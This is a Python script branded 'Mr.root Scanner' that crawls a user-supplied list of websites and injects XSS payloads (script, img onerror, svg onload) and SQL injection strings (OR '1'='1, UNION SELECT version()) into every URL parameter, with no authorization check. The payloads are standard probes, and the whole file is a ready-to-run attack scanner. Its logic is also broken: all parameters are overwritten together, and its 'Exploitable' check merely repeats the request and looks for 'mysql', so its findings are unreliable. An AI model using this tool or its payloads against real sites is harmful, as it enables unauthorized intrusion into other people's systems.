import requests
from bs4 import BeautifulSoup
import pyfiglet
from termcolor import colored
import os

# ASCII banner using pyfiglet
ascii_banner = pyfiglet.figlet_format("Mr.root Scanner")
print(colored(ascii_banner, "light_blue"))

# Common XSS payloads
xss_payloads = [
    "<script>alert('XSS')</script>",
    "'><script>alert('XSS')</script>",
    "\" onmouseover=alert('XSS') x=\"",
    "<img src=x onerror=alert('XSS')>",
    "'\"><svg/onload=alert('XSS')>"
]

# Common SQL Injection payloads
sql_payloads = [
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' UNION SELECT NULL, version()--",
    "\" UNION SELECT NULL, database()--",
    "' AND 1=1--",
    "' OR 'a'='a"
]

# Load websites from file
def load_websites(file_name):
    if not os.path.exists(file_name):
        print(colored(f"File {file_name} not found!", "red"))
        return []
    with open(file_name, "r") as file:
        return [line.strip() for line in file if line.strip()]

# Test XSS injection points
def test_xss(url):
    xss_results = []
    for payload in xss_payloads:
        if "?" in url:
            base_url, params = url.split("?", 1)
            params = params.split("&")
            for param in params:
                key, value = param.split("=")
                modified_params = {key: (payload if key == key else value) for key, value in [p.split("=") for p in params]}
                try:
                    response = requests.get(base_url, params=modified_params, timeout=10)
                    if payload in response.text:
                        xss_results.append({
                            "url": response.url,
                            "payload": payload,
                            "parameter": key
                        })
                except requests.exceptions.RequestException as e:
                    print(colored(f"[XSS TEST] Error testing {url}: {e}", "red"))
    return xss_results

# Test SQL Injection vulnerabilities
def test_sql(url):
    sql_results = []
    for payload in sql_payloads:
        if "?" in url:
            base_url, params = url.split("?", 1)
            params = params.split("&")
            for param in params:
                key, value = param.split("=")
                modified_params = {key: (payload if key == key else value) for key, value in [p.split("=") for p in params]}
                try:
                    response = requests.get(base_url, params=modified_params, timeout=10)
                    if "syntax error" in response.text.lower() or "mysql" in response.text.lower():
                        exploitable = verify_exploitability(base_url, modified_params)
                        sql_results.append({
                            "url": response.url,
                            "payload": payload,
                            "exploitable": exploitable
                        })
                except requests.exceptions.RequestException as e:
                    print(colored(f"[SQL TEST] Error testing {url}: {e}", "red"))
    return sql_results

# Verify exploitability for SQL Injection
def verify_exploitability(base_url, params):
    try:
        response = requests.get(base_url, params=params, timeout=10)
        if "syntax" in response.text.lower() or "mysql" in response.text.lower():
            return True
    except requests.exceptions.RequestException:
        pass
    return False

# Discover links within a website
def discover_links(url):
    links = []
    try:
        response = requests.get(url, timeout=10)
        soup = BeautifulSoup(response.text, "html.parser")
        for a_tag in soup.find_all("a", href=True):
            href = a_tag["href"]
            if href.startswith("http"):
                links.append(href)
            elif href.startswith("/"):
                links.append(url.rstrip("/") + href)
    except requests.exceptions.RequestException as e:
        print(colored(f"[DISCOVER] Error discovering links on {url}: {e}", "red"))
    return links

# Scan websites
def scan_websites(file_name):
    websites = load_websites(file_name)
    if not websites:
        return

    for website in websites:
        print(colored(f"\n[+] Scanning: {website}", "cyan"))

        # Discover additional links on the website
        links = discover_links(website)
        all_urls = [website] + links

        for url in all_urls:
            print(colored(f"Scanning URL: {url}", "light_blue"))

            # Test XSS vulnerabilities
            xss_results = test_xss(url)
            if xss_results:
                print(colored("[XSS Found!]", "yellow"))
                for result in xss_results:
                    print(colored(f"URL: {result['url']} | Parameter: {result['parameter']} | Payload: {result['payload']}", "green"))
            else:
                print(colored("No XSS vulnerabilities found.", "red"))

            # Test SQL Injection vulnerabilities
            sql_results = test_sql(url)
            if sql_results:
                print(colored("[SQL Injection Found!]", "yellow"))
                for result in sql_results:
                    exploitable_status = "Exploitable" if result["exploitable"] else "Not Exploitable"
                    print(colored(f"URL: {result['url']} | Payload: {result['payload']} | Status: {exploitable_status}", "green"))
            else:
                print(colored("No SQL Injection vulnerabilities found.", "red"))

    print(colored("\n[+] Scan Complete!", "light_blue"))

# Main function
if __name__ == "__main__":
    print(colored("Enter the file name containing the list of websites (e.g., list.txt):", "yellow"))
    file_name = input("> ").strip()
    scan_websites(file_name)
